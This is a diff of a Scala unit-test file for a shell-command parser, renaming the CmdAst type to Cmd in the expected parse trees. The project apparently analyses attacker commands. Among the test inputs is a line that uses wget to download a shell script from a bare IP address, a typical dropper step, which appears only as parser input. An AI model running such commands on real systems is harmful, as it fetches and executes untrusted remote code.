@@ -7,45 +7,45 @@ import io.rebelapps.ate.parser.CmdParser._
 class CmdParserSpec extends FlatSpec with Matchers {
 
   "A cmd parser" should "parse simple cmd" in {
-    parse("ls") shouldBe Right(CmdAst("ls"))
-    parse("start_tinc1.sh") shouldBe Right(CmdAst("start_tinc1.sh"))
+    parse("ls") shouldBe Right(Cmd("ls"))
+    parse("start_tinc1.sh") shouldBe Right(Cmd("start_tinc1.sh"))
   }
 
   it should "parse simple cmd with arguments" in {
-    parse("ls  -l") shouldBe Right(CmdAst("ls", SimpleArgumentAst("-l")))
-    parse("cd /tmp") shouldBe Right(CmdAst("cd", SimpleArgumentAst("/tmp")))
-    parse("ls  -l    -a") shouldBe Right(CmdAst("ls", SimpleArgumentAst("-l"), SimpleArgumentAst("-a")))
-    parse("wget     http://12.323.432.232/bin.sh") shouldBe Right(CmdAst("wget", SimpleArgumentAst("http://12.323.432.232/bin.sh")))
-    parse("""ls  -l    -a "*.txt"   """) shouldBe Right(CmdAst("ls", SimpleArgumentAst("-l"), SimpleArgumentAst("-a"), DoubleQuoted("*.txt")))
-    parse("""ls  -l    -a '*.txt'   """) shouldBe Right(CmdAst("ls", SimpleArgumentAst("-l"), SimpleArgumentAst("-a"), SingleQuoted("*.txt")))
-    parse("""ls  -l    -a "*.\"txt"   """) shouldBe Right(CmdAst("ls", SimpleArgumentAst("-l"), SimpleArgumentAst("-a"), DoubleQuoted("*.\\\"txt")))
-    parse("""ls  -l    -a '*.\'txt'   """) shouldBe Right(CmdAst("ls", SimpleArgumentAst("-l"), SimpleArgumentAst("-a"), SingleQuoted("*.\\\'txt")))
+    parse("ls  -l") shouldBe Right(Cmd("ls", SimpleArgumentAst("-l")))
+    parse("cd /tmp") shouldBe Right(Cmd("cd", SimpleArgumentAst("/tmp")))
+    parse("ls  -l    -a") shouldBe Right(Cmd("ls", SimpleArgumentAst("-l"), SimpleArgumentAst("-a")))
+    parse("wget     http://12.323.432.232/bin.sh") shouldBe Right(Cmd("wget", SimpleArgumentAst("http://12.323.432.232/bin.sh")))
+    parse("""ls  -l    -a "*.txt"   """) shouldBe Right(Cmd("ls", SimpleArgumentAst("-l"), SimpleArgumentAst("-a"), DoubleQuoted("*.txt")))
+    parse("""ls  -l    -a '*.txt'   """) shouldBe Right(Cmd("ls", SimpleArgumentAst("-l"), SimpleArgumentAst("-a"), SingleQuoted("*.txt")))
+    parse("""ls  -l    -a "*.\"txt"   """) shouldBe Right(Cmd("ls", SimpleArgumentAst("-l"), SimpleArgumentAst("-a"), DoubleQuoted("*.\\\"txt")))
+    parse("""ls  -l    -a '*.\'txt'   """) shouldBe Right(Cmd("ls", SimpleArgumentAst("-l"), SimpleArgumentAst("-a"), SingleQuoted("*.\\\'txt")))
   }
 
   it should "parse simple cmd with cmd substitution" in {
-    parse("""ls  -l `cat test.txt`   """) shouldBe Right(CmdAst("ls", SimpleArgumentAst("-l"), CmdSubstitution(CmdAst("cat", SimpleArgumentAst("test.txt")))))
-    parse("""ls  -l `echo "*.txt"`   """) shouldBe Right(CmdAst("ls", SimpleArgumentAst("-l"), CmdSubstitution(CmdAst("echo", DoubleQuoted("*.txt")))))
-    parse("""ls  -l $(cat test.txt)   """) shouldBe Right(CmdAst("ls", SimpleArgumentAst("-l"), CmdSubstitution(CmdAst("cat", SimpleArgumentAst("test.txt")))))
-    parse("""ls  -l $(echo "*.txt")   """) shouldBe Right(CmdAst("ls", SimpleArgumentAst("-l"), CmdSubstitution(CmdAst("echo", DoubleQuoted("*.txt")))))
-    parse("""ls  -l $(ls /usr/bin/* | grep zip)   """) shouldBe Right(CmdAst("ls", SimpleArgumentAst("-l"), CmdSubstitution(PipeCombinator(CmdAst("ls", SimpleArgumentAst("/usr/bin/*")), CmdAst("grep", SimpleArgumentAst("zip"))))))
-    parse("""echo `uname` $USER test $PWD""") shouldBe Right(CmdAst("echo", CmdSubstitution(CmdAst("uname")), SimpleArgumentAst("$USER"), SimpleArgumentAst("test"), SimpleArgumentAst("$PWD")))
-    parse("""echo $(uname) $USER test $PWD""") shouldBe Right(CmdAst("echo", CmdSubstitution(CmdAst("uname")), SimpleArgumentAst("$USER"), SimpleArgumentAst("test"), SimpleArgumentAst("$PWD")))
-    parse("""echo `uname` | grep zip""") shouldBe Right(PipeCombinator(CmdAst("echo",List(CmdSubstitution(CmdAst("uname")))), CmdAst("grep",List(SimpleArgumentAst("zip")))))
+    parse("""ls  -l `cat test.txt`   """) shouldBe Right(Cmd("ls", SimpleArgumentAst("-l"), CmdSubstitution(Cmd("cat", SimpleArgumentAst("test.txt")))))
+    parse("""ls  -l `echo "*.txt"`   """) shouldBe Right(Cmd("ls", SimpleArgumentAst("-l"), CmdSubstitution(Cmd("echo", DoubleQuoted("*.txt")))))
+    parse("""ls  -l $(cat test.txt)   """) shouldBe Right(Cmd("ls", SimpleArgumentAst("-l"), CmdSubstitution(Cmd("cat", SimpleArgumentAst("test.txt")))))
+    parse("""ls  -l $(echo "*.txt")   """) shouldBe Right(Cmd("ls", SimpleArgumentAst("-l"), CmdSubstitution(Cmd("echo", DoubleQuoted("*.txt")))))
+    parse("""ls  -l $(ls /usr/bin/* | grep zip)   """) shouldBe Right(Cmd("ls", SimpleArgumentAst("-l"), CmdSubstitution(PipeCombinator(Cmd("ls", SimpleArgumentAst("/usr/bin/*")), Cmd("grep", SimpleArgumentAst("zip"))))))
+    parse("""echo `uname` $USER test $PWD""") shouldBe Right(Cmd("echo", CmdSubstitution(Cmd("uname")), SimpleArgumentAst("$USER"), SimpleArgumentAst("test"), SimpleArgumentAst("$PWD")))
+    parse("""echo $(uname) $USER test $PWD""") shouldBe Right(Cmd("echo", CmdSubstitution(Cmd("uname")), SimpleArgumentAst("$USER"), SimpleArgumentAst("test"), SimpleArgumentAst("$PWD")))
+    parse("""echo `uname` | grep zip""") shouldBe Right(PipeCombinator(Cmd("echo",List(CmdSubstitution(Cmd("uname")))), Cmd("grep",List(SimpleArgumentAst("zip")))))
   }
 
   it should "parse compound cmds" in {
-    parse("ls | grep zip") shouldBe Right(PipeCombinator(CmdAst("ls"), CmdAst("grep", SimpleArgumentAst("zip"))))
-    parse("ls * | grep zip") shouldBe Right(PipeCombinator(CmdAst("ls", SimpleArgumentAst("*")), CmdAst("grep", SimpleArgumentAst("zip"))))
-    parse("ls ; grep zip") shouldBe Right(ThenCombinator(CmdAst("ls"), CmdAst("grep", SimpleArgumentAst("zip"))))
-    parse("ls && grep zip") shouldBe Right(AndCombinator(CmdAst("ls"), CmdAst("grep", SimpleArgumentAst("zip"))))
-    parse("ls || grep zip") shouldBe Right(OrCombinator(CmdAst("ls"), CmdAst("grep", SimpleArgumentAst("zip"))))
-    parse("ls| grep zip") shouldBe Right(PipeCombinator(CmdAst("ls"), CmdAst("grep", SimpleArgumentAst("zip"))))
-    parse("ls; grep zip") shouldBe Right(ThenCombinator(CmdAst("ls"), CmdAst("grep", SimpleArgumentAst("zip"))))
-    parse("ls&& grep zip") shouldBe Right(AndCombinator(CmdAst("ls"), CmdAst("grep", SimpleArgumentAst("zip"))))
-    parse("ls|| grep zip") shouldBe Right(OrCombinator(CmdAst("ls"), CmdAst("grep", SimpleArgumentAst("zip"))))
-    parse("ls && grep && cd") shouldBe Right(AndCombinator(CmdAst("ls"), AndCombinator(CmdAst("grep"), CmdAst("cd"))))
-    parse("ls | grep zip | grep test") shouldBe Right(PipeCombinator(CmdAst("ls"), PipeCombinator(CmdAst("grep", SimpleArgumentAst("zip")), CmdAst("grep", SimpleArgumentAst("test")))))
-    parse("ls | grep zip && grep test") shouldBe Right(PipeCombinator(CmdAst("ls"), AndCombinator(CmdAst("grep", SimpleArgumentAst("zip")), CmdAst("grep", SimpleArgumentAst("test")))))
+    parse("ls | grep zip") shouldBe Right(PipeCombinator(Cmd("ls"), Cmd("grep", SimpleArgumentAst("zip"))))
+    parse("ls * | grep zip") shouldBe Right(PipeCombinator(Cmd("ls", SimpleArgumentAst("*")), Cmd("grep", SimpleArgumentAst("zip"))))
+    parse("ls ; grep zip") shouldBe Right(ThenCombinator(Cmd("ls"), Cmd("grep", SimpleArgumentAst("zip"))))
+    parse("ls && grep zip") shouldBe Right(AndCombinator(Cmd("ls"), Cmd("grep", SimpleArgumentAst("zip"))))
+    parse("ls || grep zip") shouldBe Right(OrCombinator(Cmd("ls"), Cmd("grep", SimpleArgumentAst("zip"))))
+    parse("ls| grep zip") shouldBe Right(PipeCombinator(Cmd("ls"), Cmd("grep", SimpleArgumentAst("zip"))))
+    parse("ls; grep zip") shouldBe Right(ThenCombinator(Cmd("ls"), Cmd("grep", SimpleArgumentAst("zip"))))
+    parse("ls&& grep zip") shouldBe Right(AndCombinator(Cmd("ls"), Cmd("grep", SimpleArgumentAst("zip"))))
+    parse("ls|| grep zip") shouldBe Right(OrCombinator(Cmd("ls"), Cmd("grep", SimpleArgumentAst("zip"))))
+    parse("ls && grep && cd") shouldBe Right(AndCombinator(Cmd("ls"), AndCombinator(Cmd("grep"), Cmd("cd"))))
+    parse("ls | grep zip | grep test") shouldBe Right(PipeCombinator(Cmd("ls"), PipeCombinator(Cmd("grep", SimpleArgumentAst("zip")), Cmd("grep", SimpleArgumentAst("test")))))
+    parse("ls | grep zip && grep test") shouldBe Right(PipeCombinator(Cmd("ls"), AndCombinator(Cmd("grep", SimpleArgumentAst("zip")), Cmd("grep", SimpleArgumentAst("test")))))
   }
 
   it should "parse hackers cmds" in {
